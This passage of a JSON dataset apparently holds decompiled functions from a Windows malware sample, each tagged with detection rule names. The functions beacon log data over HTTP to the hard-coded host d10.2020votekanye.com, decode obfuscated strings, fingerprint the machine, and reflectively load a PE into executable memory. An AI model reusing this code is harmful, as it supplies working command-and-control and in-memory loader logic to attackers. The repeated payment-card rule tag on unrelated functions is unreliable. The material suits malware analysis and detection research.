        "decompiled_code": "\nvoid __fastcall fcn.00401e4e(uint32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA;\n    var_8h = param_1;\n    var_4h = param_1;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(\"test_04\");\n    iVar3 = (*pcVar1)(\"/log?id=%s&msg=%s\");\n    iVar4 = (*pcVar1)(param_1);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar4 + 2 + iVar2 + iVar3);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    if (iVar2 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfA)(iVar2, \"/log?id=%s&msg=%s\", \"test_04\", param_1);\n        if (((*0x41daa8 != 0) || (*0x41daa8 = (*_sym.imp.WININET.dll_InternetOpenA)(0, 0, 0, 0, 0),  *0x41daa8 != 0)) &&\n           ((*0x41daac != 0 ||\n            (*0x41daac = (*_sym.imp.WININET.dll_InternetConnectA)\n                                   (*0x41daa8, \"d10.2020votekanye.com\", 0x50, 0, 0, 3, 0, 0),  *0x41daac != 0)))) {\n            iVar3 = (*_sym.imp.WININET.dll_HttpOpenRequestA)\n                              (*0x41daac, 0x4104ac, iVar2, \"HTTP/1.1\", 0, 0, 0x84040300, 0);\n            var_8h = 4;\n            (*_sym.imp.WININET.dll_InternetQueryOptionW)(iVar3, 0x1f, &var_4h, &var_8h);\n            var_4h = var_4h | 0x3100;\n            (*_sym.imp.WININET.dll_InternetSetOptionW)(iVar3, 0x1f, &var_4h, 4);\n            if (iVar3 != 0) {\n                (*_sym.imp.WININET.dll_HttpSendRequestA)(iVar3, 0, 0, 0, 0);\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(iVar3);\n            }\n        }\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        return;\n    }\n    return;\n}\n",
        "token_count": 667
    },
    "00401f6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00401f6b(uint lpString, uint arglist)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint dwErrCode;\n    uint var_1h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    iVar6 = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    iVar5 = iVar2;\n    do {\n        uVar7 = uVar3;\n        uVar3 = uVar7 + 0x200;\n        if (iVar6 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            iVar6 = 0;\n        }\n        if (0xa00000 < uVar3) {\ncode_r0x0040201b:\n            bVar1 = true;\n            goto code_r0x00401fec;\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, uVar7 + 0x201);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        if (iVar6 == 0) goto code_r0x0040201b;\n        iVar5 = (*_sym.imp.SHLWAPI.dll_wvnsprintfA)(iVar6, uVar3, lpString, &arglist);\n    } while ((iVar5 < 0) || (uVar7 + 0x1ff <= iVar5));\n    bVar1 = false;\ncode_r0x00401fec:\n    *(iVar5 + iVar6) = 0;\n    if (!bVar1) {\n        fcn.00401e4e();\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    (*_sym.imp.KERNEL32.dll_SetLastError)(iVar2);\n    return;\n}\n",
        "token_count": 504
    },
    "00406492": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.00406492(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x41dae0), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x41dae0));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 113
    },
    "00406f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406f00(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 116
    },
    "00406f1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406f1f(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00406f00();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 355
    },
    "00406fa5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00406fa5(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "004093ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004093ea(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(8, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 423
    },
    "0040964c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040964c(int32_t param_1)\n\n{\n    uint uVar1;\n    int16_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint nNumberOfBytesToWrite;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_67h;\n    uint var_62h;\n    uint var_5eh;\n    uint var_5ah;\n    uint var_56h;\n    uint var_52h;\n    uint var_4eh;\n    uint var_4ah;\n    uint var_46h;\n    uint var_42h;\n    uchar var_3eh;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int16_t *var_14h;\n    int32_t var_10h;\n    int32_t lpString2;\n    int16_t *var_8h;\n    int32_t hHeap;\n    \n    iVar6 = 8;\n    lpString2 = param_1;\n    var_10h = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_10h * 2 + 0x1a);\n        piVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (piVar2 != NULL) {\n            var_8h = piVar2;\n            uVar1 = (*pcVar5)(8, var_10h * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(piVar2, lpString2);\n                var_14h = NULL;\n                while( true ) {\n                    if (*piVar2 == 0x5c) {\n                        var_14h = piVar2;\n                    }\n                    if (*piVar2 == 0) break;\n                    piVar2 = piVar2 + 1;\n                }\n                var_14h = var_14h + 1;\n                var_34h = 0x485a554a;\n                var_30h = 0x55416e16;\n                var_2ch = 0x6e024854;\n                var_28h = 0x4836551b;\n                var_24h = 0x4836556f;\n                var_20h._0_2_ = 0x6e63;\n                uVar1 = (*pcVar5)(8, 0x21);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_1ch = iVar3;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                    if (iVar4 != 0x9c3b12) {\n                        var_10h = 6;\n                        *(iVar6 + iVar3) = *(&var_24h + iVar6 % 6) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x10);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_14h, iVar3, uVar1);\n                (*pcVar5)(hHeap, L\"\\\"%s\\\"\", lpString2);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 8;\n                if (lpString2 != 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_80h = 0xa3f1f37;\n                    var_7ch = 0x664b3450;\n                    var_78h = 0x187b190a;\n                    var_74h = 0x7651556b;\n                    var_70h = 0x34496e4e;\n                    var_6ch._0_1_ = 0x5c;\n                    stack0xffffff91 = 0x340d6e51;\n                    stack0xffffff96 = 0x19142e0f;\n                    var_62h = 0x757a4e73;\n                    var_5eh = 0x6b0d3f33;\n                    var_5ah = 0x183f411d;\n                    var_56h = 0x731c583f;\n                    var_52h = 0x561f6b5a;\n                    var_4eh = 0x5d6b0422;\n                    var_4ah = 0x2f615b4c;\n                    var_46h = 0x4e76551d;\n                    var_42h._0_2_ = 0x486e;\n                    var_42h._2_1_ = 0x34;\n                    var_3eh = 0x6b;\n                    var_24h = 0x784b6b56;\n                    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x39);\n                    var_67h._0_1_ = var_6ch;\n                    var_42h._3_1_ = var_6ch;\n                    uVar1 = (*pcVar5)(8, 0x44);\n                    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar3 = 0;\n                    var_10h = &var_80h - iVar6;\n                    do {\n                        iVar4 = (*pcVar5)();\n                        if (iVar4 != 0x1f0a1e) {\n                            var_14h = 0x5;\n                            *(iVar3 + iVar6) = *(&var_24h + iVar3 % 5) ^ (iVar3 + iVar6)[var_10h];\n                        }\n                        iVar3 = iVar3 + 1;\n                    } while (iVar3 < 0x43);\n                    uVar1 = var_18h;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar6, var_18h, var_18h);\n                    var_10h = fcn.004047cf(nNumberOfBytesToWrite);\n                    iVar3 = var_1ch;\n                    if (var_10h == 0) {\n                        var_10h = fcn.0040949c(uVar1);\n                    }\n                    uVar1 = (*pcVar5)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar5)(0, iVar6);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    iVar6 = var_10h;\n                }\n                uVar1 = (*pcVar5)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                piVar2 = var_8h;\n            }\n            uVar1 = (*pcVar5)(0, piVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1832
    },
    "004098fa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.004098fa(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *in_ECX;\n    int16_t *piVar5;\n    int16_t *piVar6;\n    \n    if (in_ECX == NULL) {\n        in_ECX = *arg_8h;\n        if (in_ECX == NULL) {\n            return in_ECX;\n        }\n    }\n    do {\n        piVar3 = in_ECX;\n        piVar5 = 0x410f34;\n        do {\n            iVar1 = *piVar5;\n            piVar5 = piVar5 + 1;\n            if (iVar1 == 0) {\n                piVar5 = piVar3 + 1;\n                if (*piVar3 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar4 = piVar5;\n                    iVar1 = *piVar4;\n                    piVar6 = 0x410f34;\n                    do {\n                        iVar2 = *piVar6;\n                        piVar6 = piVar6 + 1;\n                        if (iVar2 == iVar1) {\n                            if (iVar1 != 0) {\n                                *piVar4 = 0;\n                            }\n                            piVar5 = NULL;\n                            if (iVar1 != 0) {\n                                piVar5 = piVar4 + 1;\n                            }\n                            *arg_8h = piVar5;\n                            return piVar3;\n                        }\n                        piVar5 = piVar4 + 1;\n                    } while (iVar2 != 0);\n                } while( true );\n            }\n            in_ECX = piVar3 + 1;\n        } while (*piVar3 != iVar1);\n    } while( true );\n}\n",
        "token_count": 418
    },
    "0040996d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __fastcall fcn.0040996d(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0x3d) {\n        do {\n            if (iVar1 == 0) break;\n            param_1 = param_1 + 1;\n            iVar1 = *param_1;\n        } while (iVar1 != 0x3d);\n        if (*param_1 != 0x3d) {\n            return NULL;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 130
    },
    "00409993": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00409993(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x41127c;\n    uStack104 = *0x411278;\n    uStack108 = *0x411274;\n    name = *0x411270;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41db70;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x411280;\n    uStack92 = *0x411284;\n    uStack88 = *0x411288;\n    uStack84 = *0x41128c;\n    var_3ch = *0x411260;\n    uStack60 = *0x411264;\n    uStack56 = *0x411268;\n    uStack52 = *0x41126c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar1)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar1)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar2)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar2)(hKey);\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar1)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar1)(uVar3);\n        *0x41db78 = uVar10 ^ uVar8;\n        *0x41db7c = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41db70 = uVar8;\n        *0x41db74 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1693
    },
    "00409f1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409f1e(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    iVar6 = 0;\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar6 = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x7a)) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                if ((((iVar1 != 0) &&\n                     (puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3),  puVar4 != NULL)) &&\n                    (*puVar4 != 0)) &&\n                   (puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1),  puVar5 != NULL)) {\n                    if (*puVar5 < 0x2000) {\n                        iVar6 = 1;\n                    }\n                    else {\n                        iVar6 = 3 - (*puVar5 < 0x3000);\n                    }\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar6;\n}\n",
        "token_count": 521
    },
    "0040a041": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a041(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar6 = *(param_1[0xf] + 0x80 + param_1) + param_1;\n    if (piVar6 != param_1) {\n        for (; piVar6[3] != 0; piVar6 = piVar6 + 5) {\n            iVar1 = piVar6[3] + param_1;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar1);\n            if ((iVar2 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar1),  iVar2 == 0)) {\n                return 0;\n            }\n            puVar5 = piVar6[4] + param_1;\n            puVar4 = puVar5;\n            if (*piVar6 != 0) {\n                puVar4 = *piVar6 + param_1;\n            }\n            while( true ) {\n                uVar3 = *puVar4;\n                if (uVar3 == 0) break;\n                if (uVar3 < 0) {\n                    uVar3 = uVar3 & 0xffff;\n                }\n                else {\n                    uVar3 = uVar3 + 2 + param_1;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, uVar3);\n                *puVar5 = uVar3;\n                if (uVar3 == 0) {\n                    return 0;\n                }\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 442
    },
    "0040a19a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a19a(uint noname_0, uint *arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uchar *puVar2;\n    int16_t *in_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int16_t *piVar6;\n    uchar *puVar7;\n    uint uVar8;\n    uchar *puVar9;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar8 = 0;\n    if (((*in_ECX == 0x5a4d) && (piVar5 = *(in_ECX + 0x1e) + in_ECX,  *piVar5 == 0x4550)) &&\n       (puVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, piVar5[0x14], 0x3000, 0x40),  puVar2 != NULL)) {\n        uVar1 = *(piVar5 + 5);\n        piVar6 = in_ECX;\n        puVar7 = puVar2;\n        for (iVar3 = piVar5[0x15]; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar7 = *piVar6;\n            piVar6 = piVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        var_8h = 0;\n        if (*(piVar5 + 6) != 0) {\n            piVar4 = uVar1 + 0x2c + piVar5;\n            do {\n                puVar7 = *piVar4 + in_ECX;\n                puVar9 = puVar2 + piVar4[-2];\n                for (iVar3 = piVar4[-1]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = *puVar7;\n                    puVar7 = puVar7 + 1;\n                    puVar9 = puVar9 + 1;\n                }\n                var_8h = var_8h + 1;\n                piVar4 = piVar4 + 10;\n            } while (var_8h < *(piVar5 + 6));\n        }\n        uVar8 = 0;\n        iVar3 = fcn.0040a041();\n        if ((iVar3 == 0) || (iVar3 = fcn.0040a0de(),  iVar3 == 0)) {\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar2, piVar5[0x14], 0x4000);\n        }\n        else {\n            if (puVar2 + piVar5[10] != NULL) {\n                (*(puVar2 + piVar5[10]))(puVar2, 1, 0);\n            }\n            iVar3 = piVar5[0x14];\n            uVar8 = 1;\n            *arg_ch = puVar2;\n            *arg_10h = iVar3;\n        }\n    }\n    return uVar8;\n}\n",
        "token_count": 708
    },
    "0040a653": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
